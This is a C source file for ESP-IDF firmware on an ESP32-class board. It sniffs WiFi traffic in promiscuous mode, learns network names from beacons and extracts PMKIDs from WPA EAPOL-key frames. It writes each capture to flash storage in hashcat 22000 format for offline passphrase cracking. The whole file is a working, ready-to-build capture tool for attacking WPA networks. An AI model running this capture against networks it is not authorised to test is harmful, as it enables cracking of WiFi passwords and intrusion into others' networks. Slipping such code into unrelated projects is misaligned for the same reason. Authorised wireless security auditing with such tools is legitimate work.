/*
 * nesso_eapol.c — PMKID capture from 802.11 EAPOL-key frames.
 *
 * File I/O is done on a dedicated logger task, not on the WiFi task's
 * promiscuous callback — so neither fprintf's stack cost nor SPIFFS
 * flash-write latency can block the RX pipeline.
 *
 * Parser walkthrough for reference:
 *
 *   802.11 data frame:
 *     [FC 2][Dur 2][A1 6][A2 6][A3 6][Seq 2] (24-byte MAC header)
 *     [QoS 2]?     (+2 bytes if QoS data subtype)
 *     [LLC/SNAP 8] AA AA 03 00 00 00 <ET hi> <ET lo>
 *     [EAPOL 4]    Ver Type BodyLenHi BodyLenLo
 *     [EAPOL-key body ...]                (starts at 0x88 0x8E ethertype)
 *
 *   EAPOL-key body (RSN):
 *     [Desc 1][KeyInfo 2][KeyLen 2][ReplayCtr 8][Nonce 32][IV 16]
 *     [RSC 8][Rsvd 8][MIC 16][KeyDataLen 2][KeyData ...]
 *
 *   PMKID KDE inside key data:
 *     [ID 0xDD][Len N][OUI 00 0F AC][Type 0x04][PMKID 16 bytes]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_check.h"
#include "esp_log.h"
#include "esp_spiffs.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "nesso_eapol.h"
#include "nesso_wifi.h"

static const char *TAG = "nesso_eapol";

/* ----- types ----- */

typedef struct {
    uint8_t bssid[6];
    char    ssid[33];
    bool    ssid_known;
    bool    pmkid_saved;
    uint8_t pmkid[16];
} eapol_entry_t;

/* One work item pushed from the WiFi callback to the logger task. */
typedef struct {
    uint8_t pmkid[16];
    uint8_t ap_bssid[6];
    uint8_t sta_mac[6];
    char    ssid[33];    /* snapshot at enqueue; may be empty */
} eapol_log_item_t;

/* ----- module state ----- */

static nesso_eapol_config_t      s_cfg;
static bool                      s_running       = false;
static bool                      s_mounted_by_us = false;
static SemaphoreHandle_t         s_lock          = NULL;
static nesso_wifi_promisc_sub_t  s_sub_token     = 0;
static eapol_entry_t            *s_table         = NULL;
static size_t                    s_table_count   = 0;
static size_t                    s_table_cap     = 0;
static char                     *s_out_path      = NULL;

/* Logger task + queue — owns the FILE* entirely. */
static TaskHandle_t              s_log_task      = NULL;
static QueueHandle_t             s_log_queue     = NULL;

static uint32_t s_packets_seen     = 0;
static uint32_t s_data_frames      = 0;
static uint32_t s_eapol_frames     = 0;
static uint32_t s_pmkids_captured  = 0;
static uint32_t s_beacons_indexed  = 0;
static uint32_t s_lines_written    = 0;

/* SPIFFS mount params — must match partitions.csv "storage" label. */
#define SPIFFS_LABEL "storage"
#define SPIFFS_MOUNT "/storage"

/* ----- AP lookup table ----- */

static int find_entry(const uint8_t bssid[6])
{
    for (size_t i = 0; i < s_table_count; ++i) {
        if (memcmp(s_table[i].bssid, bssid, 6) == 0) return (int)i;
    }
    return -1;
}

static eapol_entry_t *ensure_entry(const uint8_t bssid[6])
{
    int idx = find_entry(bssid);
    if (idx >= 0) return &s_table[idx];
    if (s_table_count >= s_table_cap) return NULL;
    eapol_entry_t *e = &s_table[s_table_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->bssid, bssid, 6);
    return e;
}

/* ----- beacon SSID learning ----- */

static void maybe_learn_ssid_from_beacon(const uint8_t *buf, uint16_t len)
{
    if (len < 38) return;
    if (buf[0] != 0x80) return;        /* mgmt type + beacon subtype */
    const uint8_t *bssid = buf + 16;   /* addr3 */

    /* Walk tagged params at offset 36 to find SSID (tag 0). */
    size_t p = 36;
    while (p + 2 <= len) {
        uint8_t tag = buf[p];
        uint8_t tlen = buf[p + 1];
        if (p + 2 + tlen > len) return;
        if (tag == 0) {
            if (tlen == 0 || tlen > 32) return;  /* hidden or invalid */
            eapol_entry_t *e = ensure_entry(bssid);
            if (!e) return;
            if (!e->ssid_known) {
                memcpy(e->ssid, buf + p + 2, tlen);
                e->ssid[tlen] = '\0';
                e->ssid_known = true;
                s_beacons_indexed++;
            }
            return;
        }
        p += 2 + tlen;
    }
}

/* ----- hex + CSV helpers (called only from logger task) ----- */

static void hex_encode(const uint8_t *in, size_t n, char *out)
{
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < n; ++i) {
        out[2 * i]     = hex[(in[i] >> 4) & 0xF];
        out[2 * i + 1] = hex[in[i] & 0xF];
    }
    out[2 * n] = '\0';
}

static void write_hc22000_line(FILE *f, const eapol_log_item_t *item)
{
    if (!f) return;

    char pmkid_hex[33];
    char ap_mac_hex[13];
    char sta_mac_hex[13];
    hex_encode(item->pmkid,    16, pmkid_hex);
    hex_encode(item->ap_bssid,  6, ap_mac_hex);
    hex_encode(item->sta_mac,   6, sta_mac_hex);

    /* If we didn't learn the SSID from a beacon, fall back to the caller's
     * registered lookup at write time. Safe to call here — we're on the
     * logger task, not the WiFi task. */
    char ssid[33] = {0};
    if (item->ssid[0]) {
        memcpy(ssid, item->ssid, sizeof(ssid));
    } else if (s_cfg.ssid_cb) {
        s_cfg.ssid_cb(item->ap_bssid, ssid, sizeof(ssid), s_cfg.ssid_user);
    }

    char ssid_hex[65] = {0};
    hex_encode((const uint8_t *)ssid, strnlen(ssid, 32), ssid_hex);

    /* WPA*01*PMKID*MACAP*MACSTA*ESSID*ANONCE*EAPOL*MP — hashcat 22000. */
    fprintf(f, "WPA*01*%s*%s*%s*%s***\n",
            pmkid_hex, ap_mac_hex, sta_mac_hex, ssid_hex);
    fflush(f);
    s_lines_written++;

    ESP_LOGI(TAG, "PMKID captured: %s \"%s\"",
             ap_mac_hex, ssid[0] ? ssid : "<unknown>");
}

/* ----- logger task ----- */

static void logger_task(void *arg)
{
    const char *path = (const char *)arg;
    FILE *f = fopen(path, "a");
    if (!f) {
        ESP_LOGE(TAG, "fopen(%s) failed: logger task exiting", path);
        s_log_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    eapol_log_item_t item;
    while (s_running) {
        if (xQueueReceive(s_log_queue, &item, pdMS_TO_TICKS(500)) == pdTRUE) {
            write_hc22000_line(f, &item);
        }
    }
    fclose(f);
    s_log_task = NULL;
    vTaskDelete(NULL);
}

/* ----- EAPOL / PMKID parsing ----- */

static bool find_pmkid_in_key_data(const uint8_t *kd, uint16_t kd_len,
                                    uint8_t out_pmkid[16])
{
    size_t p = 0;
    while (p + 2 <= kd_len) {
        uint8_t id  = kd[p];
        uint8_t len = kd[p + 1];
        if (p + 2 + len > kd_len) return false;

        /* RSN PMKID KDE: 0xDD (vendor-specific) with OUI 00:0F:AC and data
         * type 0x04. Total KDE data length from OUI onwards is 4 + 16 = 20. */
        if (id == 0xDD && len >= 20 &&
            kd[p + 2] == 0x00 && kd[p + 3] == 0x0F && kd[p + 4] == 0xAC &&
            kd[p + 5] == 0x04) {
            memcpy(out_pmkid, kd + p + 6, 16);
            return true;
        }
        p += 2 + len;
    }
    return false;
}

/*
 * Given a full 802.11 data frame buffer, try to parse the EAPOL-key
 * descriptor and extract a PMKID. Returns true on success.
 */
static bool try_parse_eapol_pmkid(const uint8_t *buf, uint16_t len,
                                   uint8_t out_pmkid[16],
                                   uint8_t out_ap_bssid[6],
                                   uint8_t out_sta_mac[6])
{
    if (len < 24) return false;
    const uint8_t fc0 = buf[0];
    const uint8_t fc1 = buf[1];

    /* type == data (2) */
    if (((fc0 & 0x0C) >> 2) != 2) return false;

    /* QoS subtype → extra 2-byte QoS control field. */
    const bool is_qos = ((fc0 >> 4) & 0x08) != 0;

    /* No 4-addr (WDS) handling. If the FromDS+ToDS bits both set, give up. */
    const bool to_ds   = (fc1 & 0x01) != 0;
    const bool from_ds = (fc1 & 0x02) != 0;
    if (to_ds && from_ds) return false;

    size_t hdr = 24 + (is_qos ? 2 : 0);
    if (len < hdr + 8 + 4 + 95) return false;

    /* LLC/SNAP: AA AA 03 00 00 00 88 8E → EAPOL. */
    const uint8_t *llc = buf + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) {
        return false;
    }

    /* EAPOL header (4 bytes): ver, type, body_len big-endian. */
    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 0x03) return false;          /* EAPOL-key only */
    uint16_t body_len = ((uint16_t)eapol[2] << 8) | eapol[3];
    if ((size_t)(hdr + 8 + 4 + body_len) > len) return false;

    /* EAPOL-key descriptor. 95 bytes fixed (Desc..KeyDataLen inclusive). */
    const uint8_t *kd_hdr = eapol + 4;
    if (body_len < 95) return false;
    uint16_t key_data_len = ((uint16_t)kd_hdr[93] << 8) | kd_hdr[94];
    if ((size_t)(95 + key_data_len) > body_len) return false;

    const uint8_t *key_data = kd_hdr + 95;
    if (key_data_len == 0) return false;

    if (!find_pmkid_in_key_data(key_data, key_data_len, out_pmkid)) {
        return false;
    }

    /* Addresses: for EAPOL M1 (AP → STA, FromDS=1, ToDS=0)
     *   addr1 = STA (dest)
     *   addr2 = AP  (src)
     *   addr3 = BSSID
     * For M2 (STA → AP, ToDS=1):
     *   addr1 = AP
     *   addr2 = STA
     *   addr3 = BSSID
     * Use addr3 as BSSID either way; pick STA from the other addr. */
    memcpy(out_ap_bssid, buf + 16, 6);
    if (from_ds) memcpy(out_sta_mac, buf + 4, 6);   /* addr1 */
    else         memcpy(out_sta_mac, buf + 10, 6);  /* addr2 */
    return true;
}

/* ----- promiscuous callback ----- */

static void IRAM_ATTR eapol_rx_cb(const uint8_t *buf, uint16_t len,
                                   int8_t rssi, uint8_t channel, void *user)
{
    (void)rssi; (void)channel; (void)user;
    s_packets_seen++;
    if (len < 24) return;

    if (xSemaphoreTake(s_lock, 0) != pdTRUE) return;

    /* First pass: beacon SSID learning (management frames). */
    if (buf[0] == 0x80) {
        maybe_learn_ssid_from_beacon(buf, len);
        xSemaphoreGive(s_lock);
        return;
    }

    /* Second pass: data frames → try EAPOL parse. */
    if (((buf[0] & 0x0C) >> 2) != 2) {
        xSemaphoreGive(s_lock);
        return;
    }
    s_data_frames++;

    uint8_t pmkid[16];
    uint8_t ap_bssid[6];
    uint8_t sta_mac[6];
    if (!try_parse_eapol_pmkid(buf, len, pmkid, ap_bssid, sta_mac)) {
        xSemaphoreGive(s_lock);
        return;
    }
    s_eapol_frames++;

    eapol_entry_t *e = ensure_entry(ap_bssid);
    if (!e) {
        xSemaphoreGive(s_lock);
        return;
    }
    if (e->pmkid_saved) {
        xSemaphoreGive(s_lock);   /* dedup: already have one for this AP */
        return;
    }
    memcpy(e->pmkid, pmkid, 16);
    e->pmkid_saved = true;
    s_pmkids_captured++;

    /* Build a queue item — copy everything we need so the logger task can
     * run without touching shared state. */
    eapol_log_item_t item;
    memcpy(item.pmkid,    pmkid,    16);
    memcpy(item.ap_bssid, ap_bssid,  6);
    memcpy(item.sta_mac,  sta_mac,   6);
    if (e->ssid_known) {
        memcpy(item.ssid, e->ssid, sizeof(item.ssid));
    } else {
        item.ssid[0] = '\0';
    }

    xSemaphoreGive(s_lock);

    /* Non-blocking enqueue — logger task may be catching up; drop if full.
     * Losing one PMKID isn't catastrophic, blocking WiFi RX is. */
    (void)xQueueSend(s_log_queue, &item, 0);
}

/* ----- SPIFFS mount helper ----- */

static esp_err_t ensure_spiffs_mounted(void)
{
    if (esp_spiffs_mounted(SPIFFS_LABEL)) return ESP_OK;
    esp_vfs_spiffs_conf_t conf = {
        .base_path              = SPIFFS_MOUNT,
        .partition_label        = SPIFFS_LABEL,
        .max_files              = 4,
        .format_if_mount_failed = true,
    };
    esp_err_t err = esp_vfs_spiffs_register(&conf);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "spiffs register: %s", esp_err_to_name(err));
        return err;
    }
    s_mounted_by_us = true;
    return ESP_OK;
}

/* ----- public lifecycle ----- */

/* Cleanup everything start() has allocated so far. Safe to call on any
 * partial state. s_running must already be false when called. */
static void eapol_cleanup(void)
{
    if (s_lock)      { vSemaphoreDelete(s_lock);     s_lock      = NULL; }
    if (s_log_queue) { vQueueDelete(s_log_queue);    s_log_queue = NULL; }
    if (s_table)     { free(s_table);                s_table     = NULL;
                       s_table_count = 0; s_table_cap = 0; }
    if (s_out_path)  { free(s_out_path);             s_out_path  = NULL; }
    if (s_mounted_by_us) {
        esp_vfs_spiffs_unregister(SPIFFS_LABEL);
        s_mounted_by_us = false;
    }
}

esp_err_t nesso_eapol_start(const nesso_eapol_config_t *cfg)
{
    if (s_running) return ESP_OK;

    s_cfg = cfg ? *cfg : (nesso_eapol_config_t)NESSO_EAPOL_CONFIG_DEFAULTS();
    if (s_cfg.max_seen == 0) s_cfg.max_seen = 128;

    esp_err_t err = ESP_OK;

    const char *path = s_cfg.output_path ? s_cfg.output_path
                                         : "/storage/handshakes.hc22000";
    s_out_path = strdup(path);
    if (!s_out_path) return ESP_ERR_NO_MEM;

    err = ensure_spiffs_mounted();
    if (err != ESP_OK) goto fail;

    s_lock = xSemaphoreCreateMutex();
    if (!s_lock) { err = ESP_ERR_NO_MEM; goto fail; }

    s_log_queue = xQueueCreate(16, sizeof(eapol_log_item_t));
    if (!s_log_queue) { err = ESP_ERR_NO_MEM; goto fail; }

    s_table = calloc(s_cfg.max_seen, sizeof(*s_table));
    if (!s_table) { err = ESP_ERR_NO_MEM; goto fail; }
    s_table_cap      = s_cfg.max_seen;
    s_table_count    = 0;
    s_packets_seen   = s_data_frames = s_eapol_frames =
        s_pmkids_captured = s_beacons_indexed = s_lines_written = 0;

    /* Bring s_running true before creating the task and registering the
     * callback, so neither sees stale state. */
    s_running = true;

    /* Spawn the logger task. It owns the FILE* entirely. */
    BaseType_t ok = xTaskCreate(logger_task, "eapol_log", 4096,
                                s_out_path, 4, &s_log_task);
    if (ok != pdPASS) {
        s_running = false;
        err = ESP_ERR_NO_MEM;
        goto fail;
    }

    /* Subscribe to promisc mode — pass 0 ("all frames") since the callback
     * self-filters for beacons (0x80) and data frames (type==2). */
    err = nesso_wifi_promisc_add_subscriber(eapol_rx_cb, NULL, 0, &s_sub_token);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "promisc add subscriber: %s", esp_err_to_name(err));
        s_running = false;
        /* Nudge the logger task to exit. It sees s_running=false and will
         * drop out of the xQueueReceive loop within ~500 ms. */
        for (int i = 0; i < 20 && s_log_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
        goto fail;
    }

    ESP_LOGI(TAG, "eapol capture running → %s", s_out_path);
    return ESP_OK;

fail:
    eapol_cleanup();
    return err;
}

esp_err_t nesso_eapol_stop(void)
{
    if (!s_running) return ESP_OK;

    /*
     * Shutdown sequence, carefully ordered to avoid use-after-free when
     * an in-flight promisc callback is mid-execution on the WiFi task:
     *
     *   1. Clear s_running so the logger task will exit on its next loop.
     *   2. Remove the promisc subscriber so esp_wifi stops dispatching
     *      to our callback for new frames.
     *   3. Grace-period delay to let any in-flight callback finish. The
     *      fanout in nesso_wifi takes a struct copy of the subscriber at
     *      the top of its loop — a concurrent callback that copied the
     *      subscriber before step 2 could still be mid-execution.
     *   4. Wait for the logger task to exit (it polls s_running every
     *      500 ms via its xQueueReceive timeout).
     *   5. Free everything under the mutex.
     */
    s_running = false;

    if (s_sub_token) {
        nesso_wifi_promisc_remove_subscriber(s_sub_token);
        s_sub_token = 0;
    }

    /* Step 3: drain. 20 ms is generous; in-flight callbacks complete in
     * µs once they've passed the lock acquire. */
    vTaskDelay(pdMS_TO_TICKS(20));

    /* Step 4: wait for logger task to self-delete. */
    for (int i = 0; i < 20 && s_log_task; ++i) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    /* Step 5: teardown. Take the lock briefly to fence against the last
     * possible in-flight callback that might have raced past the drain. */
    if (s_lock) xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_lock) xSemaphoreGive(s_lock);

    eapol_cleanup();
    return ESP_OK;
}

/* ----- public status ----- */

esp_err_t nesso_eapol_status(nesso_eapol_status_t *out)
{
    if (!out) return ESP_ERR_INVALID_ARG;
    uint32_t ssids_known = 0;
    if (s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        for (size_t i = 0; i < s_table_count; ++i) {
            if (s_table[i].ssid_known) ssids_known++;
        }
        xSemaphoreGive(s_lock);
    }
    out->packets_seen          = s_packets_seen;
    out->data_frames           = s_data_frames;
    out->eapol_frames          = s_eapol_frames;
    out->pmkids_captured       = s_pmkids_captured;
    out->beacons_indexed       = s_beacons_indexed;
    out->ssids_known           = ssids_known;
    out->hc22000_lines_written = s_lines_written;
    return ESP_OK;
}
